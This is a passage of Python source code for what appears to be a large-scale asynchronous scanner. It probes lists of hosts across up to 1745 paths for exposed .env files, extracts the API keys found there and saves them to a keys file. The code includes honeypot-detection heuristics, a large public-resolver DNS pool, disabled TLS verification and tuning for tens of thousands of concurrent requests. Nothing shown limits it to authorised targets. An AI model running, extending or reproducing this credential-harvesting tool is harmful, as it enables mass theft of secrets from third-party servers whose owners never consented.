            # ── Early-abort heuristics for deep mode ──────────────────────
            # After the first (smaller) probe batch decide whether to keep going.
            # Skip remaining batches if the server is clearly hostile, dead,
            # or returns the same response for every path.
            if deep_mode and i == TIER1 and not mode_results:
                seen = i
                # 1. Connection-refusal/timeout storm — host is effectively dead
                if conn_errors > seen * 0.6:
                    break
                # 2. Dominant single response code (e.g. 80%+ 403/404/401/400
                #    with no 200) — server is uniformly blocking. Tightened
                #    from 95% to 80% to abort more aggressively on tier-1.
                if non_200_codes:
                    top_code, top_count = max(non_200_codes.items(), key=lambda x: x[1])
                    if top_count >= seen * 0.80 and top_code in (403, 404, 401, 400):
                        break

        # If the host refused/timed-out on >80% of requests, no point in more modes
        if conn_errors > len(paths_to_run) * 0.8:
            break

        # Catch-all: if 5+ hits share the same content hash, server returns
        # the same body for every path → honeypot/CDN redirect — discard all
        if len(mode_results) >= 5:
            hashes = [r["_content_hash"] for r in mode_results]
            most_common = max(set(hashes), key=hashes.count)
            if hashes.count(most_common) >= 5:
                mode_results = [r for r in mode_results
                                if r["_content_hash"] != most_common]

        for r in mode_results:
            r.pop("_content_hash", None)
        results.extend(mode_results)

    return results


# ── File I/O ──────────────────────────────────────────────────────────────────

def _write_status(data: dict) -> None:
    # Stamp the engine on every status write so the API/UI can attribute the
    # currently-running scan to the correct engine. Without this, switching
    # the engine_config mid-scan would make /status report the *new* engine
    # while the *old* engine is still producing the data.
    data.setdefault("engine", "py")
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    tmp = STATUS_FILE.with_suffix(".tmp")
    tmp.write_text(json.dumps(data))
    tmp.replace(STATUS_FILE)

def _append_jsonl(path: Path, rows: list[dict]) -> None:
    if not rows: return
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("a") as f:
        for r in rows: f.write(json.dumps(r, ensure_ascii=False) + "\n")


# ── Main ──────────────────────────────────────────────────────────────────────

async def main() -> None:
    global _dns_pool
    DATA_DIR.mkdir(parents=True, exist_ok=True)

    timeout     = int(os.environ.get("ENV_SCAN_TIMEOUT",     "2"))
    concurrency = int(os.environ.get("ENV_SCAN_CONCURRENCY", "60"))
    max_fail    = int(os.environ.get("ENV_SCAN_MAX_FAIL",    "2"))
    paths_env   = os.environ.get("ENV_SCAN_PATHS", "")
    full_scan   = os.environ.get("ENV_SCAN_FULL", "").lower() in ("1", "true", "yes")
    if paths_env:
        paths = [p for p in paths_env.split(",") if p]
    elif full_scan:
        paths = _BASE_ENV_PATHS   # all 1745 paths
    else:
        paths = ENV_PATHS          # fast 20 paths (default)

    # ── Host concurrency (separate from path concurrency) ─────────────────
    # `concurrency` controls in-flight HTTP requests globally (path-level).
    # Host concurrency caps how many hosts are scanned in parallel.
    # In deep mode (>200 paths) each host can have up to limit_per_host=50
    # sockets in flight; with 300 hosts in parallel that's ~15000 TLS states
    # crushing the event loop. Cap host parallelism so each host actually
    # gets enough path slots to fire its tier-1 batch quickly.
    #
    # Heuristic: for deep mode aim for host_conc * 50 ≈ 1500 in-flight max
    # (well within event-loop comfort and FD budget). Override with
    # ENV_SCAN_HOST_CONCURRENCY for tuning.
    deep = len(paths) > 200
    default_host_conc = min(concurrency, 30) if deep else concurrency
    host_concurrency = int(os.environ.get("ENV_SCAN_HOST_CONCURRENCY",
                                          str(default_host_conc)))
    # Defensive clamp: misconfigured 0 or negative value would produce zero
    # workers and stall the scan forever.
    host_concurrency = max(1, host_concurrency)

    # ── Run identification: every scan gets a unique id + trigger + started_at.
    # This lets the UI distinguish runs and avoids stale-progress confusion when
    # a new run starts before the previous status was cleared.
    run_id     = f"{int(time.time())}-{secrets.token_hex(3)}"
    trigger    = os.environ.get("ENV_SCAN_TRIGGER", "manual")
    started_at = _now()
    print(f"[env_scanner] run_id={run_id} trigger={trigger} started_at={started_at} "
          f"conc={concurrency} host_conc={host_concurrency} paths={len(paths)} deep={deep}", flush=True)

    # Seed module-level state so __main__'s finally block can record a history
    # entry even if the scan never reaches normal completion.
    _run_state.update({
        "engine":             "py",
        "run_id":             run_id,
        "trigger":            trigger,
        "started_at":         started_at,
        "finished_at":        None,
        "total":              0,
        "processed":          0,
        "found":              0,
        "keys":               0,
        "elapsed_seconds":    0,
        "rate_per_sec":       0,
        "deep_scan":          full_scan,
        "concurrency":        concurrency,
        "stopped":            False,
        "interrupted":        False,
        "dns_init_seconds":   0,
        "dns_cache_source":   "skipped",
    })

    # IMMEDIATELY write a fresh status so the UI sees the new run before DNS
    # init (which can take 100+ seconds) — without this, stale progress from
    # the previous run lingers on screen.
    _write_status({
        "running": True, "scanner": "env",
        "run_id": run_id, "trigger": trigger, "started_at": started_at,
        "current_action": "initializing…",
        "processed": 0, "total": 0, "found": 0, "keys": 0,
        "elapsed_seconds": 0, "rate_per_sec": 0, "eta_seconds": 0,
        "updated_at": _now(),
        "deep_scan": full_scan,
        "concurrency": concurrency,
        "dns": {},
    })

    if not INPUT_FILE.exists():
        print("[env_scanner] No input file, exiting.", flush=True)
        _write_status({
            "running": False, "scanner": "env",
            "run_id": run_id, "trigger": trigger,
            "started_at": started_at, "finished_at": _now(),
            "current_action": "no input file",
            "processed": 0, "total": 0, "found": 0, "keys": 0,
            "elapsed_seconds": 0, "rate_per_sec": 0, "eta_seconds": 0,
            "updated_at": _now(),
        })
        return

    # ── Initialize distributed DNS pool (lightweight — rdns is optional) ───
    skip_dns = os.environ.get("ENV_SCAN_SKIP_DNS", "").lower() in ("1", "true", "yes")
    if not skip_dns:
        print("[env_scanner] Initializing DNS pool…", flush=True)
        # Background ticker so the UI sees "DNS pool init — Ns elapsed" while
        # the pool fetches/probes 40k+ public resolvers (can take 2-3 min).
        # Without this, status sits on a static "initializing…" for minutes,
        # which looks frozen.
        init_start = time.time()
        async def _init_ticker() -> None:
            try:
                while True:
                    await asyncio.sleep(2)
                    elapsed = int(time.time() - init_start)
                    _write_status({
                        "running": True, "scanner": "env",
                        "run_id": run_id, "trigger": trigger, "started_at": started_at,
                        "current_action": f"DNS pool init — {elapsed}s elapsed (fetching + probing public resolvers, ~2-3 min)",
                        "processed": 0, "total": 0, "found": 0, "keys": 0,
                        "elapsed_seconds": elapsed, "rate_per_sec": 0, "eta_seconds": 0,
                        "updated_at": _now(),
                        "deep_scan": full_scan,
                        "concurrency": concurrency,
                        "dns": {},
                    })
            except asyncio.CancelledError:
                pass
        ticker_task = asyncio.create_task(_init_ticker())
        try:
            _dns_pool = _dns_resolvers.ResolverPool(
                probe_concurrency=500,
                probe_timeout=1.5,
                keep=500,
                rdns_timeout=2.0,
                refresh_interval=3600,
                prefer_doh=False,
                fetch_online=True,
            )
            await _dns_pool.start()
            print(f"[env_scanner] DNS pool ready: {_dns_pool.size} resolvers", flush=True)
        except Exception as exc:
            print(f"[env_scanner] DNS pool failed ({exc}), skipping rdns", flush=True)
            _dns_pool = None
        finally:
            ticker_task.cancel()
            try:
                await ticker_task
            except (asyncio.CancelledError, Exception):
                pass
        # Bridge: between pool ready and first batch start, show "loading hosts".
        _write_status({
            "running": True, "scanner": "env",
            "run_id": run_id, "trigger": trigger, "started_at": started_at,
            "current_action": f"DNS pool ready ({_dns_pool.size if _dns_pool else 0} resolvers) — loading host list…",
            "processed": 0, "total": 0, "found": 0, "keys": 0,
            "elapsed_seconds": int(time.time() - init_start), "rate_per_sec": 0, "eta_seconds": 0,
            "updated_at": _now(),
            "deep_scan": full_scan,
            "concurrency": concurrency,
            "dns": {},
        })
    else:
        print("[env_scanner] DNS pool skipped (ENV_SCAN_SKIP_DNS=1)", flush=True)
        _dns_pool = None

    all_hosts = [h.strip() for h in INPUT_FILE.read_text().splitlines()
                 if h.strip() and not h.startswith("#")]
    if not all_hosts:
        print("[env_scanner] Empty input, exiting.", flush=True)
        return

    start_idx = 0
    if OFFSET_FILE.exists():
        try: start_idx = int(OFFSET_FILE.read_text().strip())
        except Exception: pass

    hosts = all_hosts[start_idx:]
    total = len(all_hosts)

    # shared state
    processed  = start_idx
    found_total = 0
    keys_total  = 0
    start_time  = time.time()
    lock        = asyncio.Lock()

    dns_stats = _dns_pool.stats if _dns_pool else {
        "udp_resolvers": 0, "doh_enabled": False,
        "doh_providers": 0, "aiodns_available": False, "strategy": "system"
    }

    def _status(action: str = "") -> dict:
        elapsed = max(1, time.time() - start_time)
        rate    = round(processed / elapsed, 1)
        eta     = int((total - processed) / rate) if rate > 0 and processed > start_idx else 0
        return {
            "running": True, "scanner": "env",
            "run_id": run_id, "trigger": trigger, "started_at": started_at,
            "current_action": action or f"scanning {processed}/{total}",
            "processed": processed, "total": total,
            "found": found_total, "keys": keys_total,
            "elapsed_seconds": int(elapsed),
            "rate_per_sec": rate, "eta_seconds": eta,
            "updated_at": _now(),
            "deep_scan": full_scan,
            "concurrency": concurrency,
            "host_concurrency": host_concurrency,
            "dns": dns_stats,
        }

    _write_status({
        "running": True, "scanner": "env",
        "run_id": run_id, "trigger": trigger, "started_at": started_at,
        "current_action": "starting…",
        "processed": start_idx, "total": total,
        "found": 0, "keys": 0,
        "elapsed_seconds": 0, "rate_per_sec": 0, "eta_seconds": 0,
        "updated_at": _now(),
        "deep_scan": full_scan,
        "concurrency": concurrency,
        "host_concurrency": host_concurrency,
        "dns": dns_stats,
    })

    # status updater background task
    async def status_loop() -> None:
        while True:
            await asyncio.sleep(2)
            _write_status(_status())
            OFFSET_FILE.write_text(str(processed))

    # Worker semaphore (limits concurrent hosts being processed).
    # Decoupled from `concurrency` — see host_concurrency calculation above.
    host_sem  = asyncio.Semaphore(host_concurrency)
    # Path-level semaphore (limits total in-flight HTTP requests globally).
    # In deep mode each host needs ~50 in-flight slots for its tier-1 batch
    # to complete quickly, so size = host_concurrency * 50 + overhead.
    # Cap at 4000 (FD budget; conservative for the runtime).
    path_sem  = asyncio.Semaphore(min(4000, max(concurrency * 5, host_concurrency * 60)))

    queue: asyncio.Queue[str | None] = asyncio.Queue()
    for h in hosts:
        await queue.put(h)
    # sentinel values to stop workers — one per worker task
    NWORKERS = host_concurrency
    for _ in range(NWORKERS):
        await queue.put(None)

    # ── Connection pool tuning ─────────────────────────────────────────
    # `limit=0` (unlimited total) lets path_sem be the real regulator of
    # in-flight requests. `limit_per_host=50` prevents pummeling any one
    # host while still allowing many parallel hosts. `keepalive_timeout=30`
    # keeps connections warm between path checks of the same host (huge win
    # for deep mode with hundreds of paths per host).
    #
    # NOTE: limit_per_host was bumped from 20 → 50 together with the global
    # concurrency bump (60 → 300) to keep the per-host slice proportional;
    # otherwise raising the global limit alone leaves us bottlenecked on
    # any single slow host with a wide path list.
    connector = aiohttp.TCPConnector(
        ssl=False,
        limit=0,
        limit_per_host=50,
        keepalive_timeout=30,
        ttl_dns_cache=300,
        enable_cleanup_closed=True,
    )

    async with aiohttp.ClientSession(connector=connector) as session:

        status_task = asyncio.create_task(status_loop())

        async def worker() -> None:
            nonlocal processed, found_total, keys_total
            while True:
                host = await queue.get()
                if host is None:
                    queue.task_done()
                    return
                if STOP_FILE.exists():
                    queue.task_done()
                    return
                try:
                    async with host_sem:
                        items = await scan_host(session, host, paths, timeout, max_fail, path_sem)
                    async with lock:
                        processed += 1
                        if items:
                            found_total += len(items)
                            all_keys: list[dict] = []
                            for item in items:
                                # Build masked preview list BEFORE popping the
                                # full key dicts. UI shows this in the
                                # expanded row so the user can see WHAT was
                                # matched (masked) without re-reading the raw
                                # body. Cap at 10 per row.
                                item["keys_preview"] = [
                                    {"service": k.get("service"),
                                     "category": k.get("category"),
                                     "masked": k.get("key_masked"),
                                     "snippet": (k.get("snippet") or "")[:200]}
                                    for k in item.get("keys", [])[:10]
                                ]
                                all_keys.extend(item.pop("keys", []))
                                # Tag every result with the run that produced it,
                                # so the UI can filter by run.
                                item["run_id"]  = run_id
                                item["trigger"] = trigger
                                print(f"[FOUND] {item['url']} ({item['content_length']}b, {item['keys_found']} keys)", flush=True)
                            for k in all_keys:
                                k["run_id"]  = run_id
                                k["trigger"] = trigger
                            keys_total += len(all_keys)
                            _append_jsonl(ENV_FOUND, items)
                            if all_keys:
                                _append_jsonl(KEYS_FILE, all_keys)
                except Exception as e:
                    async with lock:
                        processed += 1
                    print(f"[err] {host}: {e}", flush=True)
                finally:
                    queue.task_done()

        workers = [asyncio.create_task(worker()) for _ in range(NWORKERS)]
        await asyncio.gather(*workers)
        status_task.cancel()
        try: await status_task
        except asyncio.CancelledError: pass

    stopped = STOP_FILE.exists()
    OFFSET_FILE.write_text(str(total))
    STOP_FILE.unlink(missing_ok=True)

    elapsed     = int(time.time() - start_time)
    finished_at = _now()
    summary     = (
        f"stopped — {processed}/{total} hosts, {found_total} .env files, {keys_total} API keys"
        if stopped else
        f"done — {total} hosts scanned, {found_total} .env files, {keys_total} API keys"
    )

    # Re-snapshot DNS stats at completion so the final status carries the
    # cache provenance (cache_source, init_time_s, etc.) — without this the
    # UI sees zeroed-out DNS fields once the scan flips to "done".
    final_dns_stats = _dns_pool.stats if _dns_pool else {}

    _write_status({
        "running": False, "scanner": "env",
        "run_id": run_id, "trigger": trigger,
        "started_at": started_at, "finished_at": finished_at,
        "current_action": summary,
        "processed": processed if stopped else total, "total": total,
        "found": found_total, "keys": keys_total,
        "elapsed_seconds": elapsed,
        "rate_per_sec": round(processed / max(1, elapsed), 1),
        "eta_seconds": 0, "updated_at": finished_at,
        "deep_scan": full_scan,
        "concurrency": concurrency,
        "stopped": stopped,
        "dns": final_dns_stats,
    })

    # Update module-level state with final values; the actual JSONL append is
    # done in __main__'s finally block so interrupted runs are also recorded.
    # Preserve "skipped" provenance when ENV_SCAN_SKIP_DNS=1 — in that case
    # dns_stats is empty (no pool), so falling back to "fresh" would be a lie.
    prior_dns_src = _run_state.get("dns_cache_source", "fresh")
    _run_state.update({
        "finished_at":      finished_at,
        "total":            total,
        "processed":        processed if stopped else total,
        "found":            found_total,
        "keys":             keys_total,
        "elapsed_seconds":  elapsed,
        "rate_per_sec":     round(processed / max(1, elapsed), 1),
        "stopped":          stopped,
        "dns_init_seconds": round(dns_stats.get("init_time_s", 0), 1),
        "dns_cache_source": dns_stats.get("cache_source", prior_dns_src),
    })

    print(f"[env_scanner] Done: run_id={run_id} {processed}/{total} hosts, {found_total} found, {keys_total} keys", flush=True)


def _flush_history_record() -> None:
    """Append a single history record from `_run_state`. Always called from
    __main__'s finally block so we record even crashed/killed scans."""
    if not _run_state.get("run_id"):
        return  # main() never reached run_id assignment
    if not _run_state.get("finished_at"):
        # Interrupted before normal completion — fill in the gap.
        _run_state["finished_at"] = _now()
        _run_state["interrupted"] = True
        _run_state["stopped"] = True
    try:
        _append_jsonl(HISTORY_FILE, [dict(_run_state)])
    except Exception as e:
        print(f"[env_scanner] WARN: failed to write history: {e}", flush=True)


def _signal_exit(signum: int, _frame: Any) -> None:
    """Translate SIGTERM/SIGINT into SystemExit so __main__'s `finally` runs.

    Default SIGTERM handling kills the process before Python-level finally
    blocks fire — that means an interrupted scan would not record a history
    entry. Raising SystemExit gives us deterministic cleanup."""
    print(f"[env_scanner] received signal {signum}, shutting down…", flush=True)
    # Mark stop file so any in-progress scan loop also exits gracefully.
    try:
        STOP_FILE.touch()
    except Exception:
        pass
    sys.exit(128 + signum)


if __name__ == "__main__":
    signal.signal(signal.SIGTERM, _signal_exit)
    signal.signal(signal.SIGINT, _signal_exit)
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
    except SystemExit:
        pass
    except Exception as e:
        print(f"[env_scanner] FATAL: {e}", flush=True)
    finally:
        _flush_history_record()
